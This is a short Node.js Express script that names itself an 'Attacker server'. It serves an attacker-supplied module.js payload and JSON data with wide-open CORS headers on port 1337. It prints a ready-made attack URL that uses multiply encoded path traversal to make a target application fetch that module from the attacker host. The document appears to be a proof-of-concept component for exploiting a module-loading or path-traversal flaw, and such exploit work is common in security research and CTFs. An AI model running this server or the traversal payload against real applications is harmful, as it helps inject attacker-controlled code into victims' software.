import express from "express";
import fs from "node:fs";

const app = express();

const json = JSON.parse(fs.readFileSync(`./module.json`, 'utf8'));
const js = fs.readFileSync(`./module.js`, 'utf8');

app.use(/(.*)/, (req, res, next) => {
    res.setHeader("Access-Control-Allow-Origin", "*");
    res.setHeader("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS");
    res.setHeader("Access-Control-Allow-Headers", "*");
    res.setHeader("Access-Control-Allow-Credentials", "true");
    next();
});

app.get("/module.js", (req, res) => {
    return res.status(200).type("application/javascript").send(js);
});

app.use(/(.*)/, (req, res) => {
    return res.status(200).json(json);
});

app.listen(1337, '0.0.0.0', () => {
    console.log("Attacker server running on http://localhost:1337");
    console.log("Use this URL in the attack: http://localhost/a/..%2f..%2f..%2fpublic%2f..%252f%255Clocalhost:1337%252f%253F%252f..%252f..%23");
});
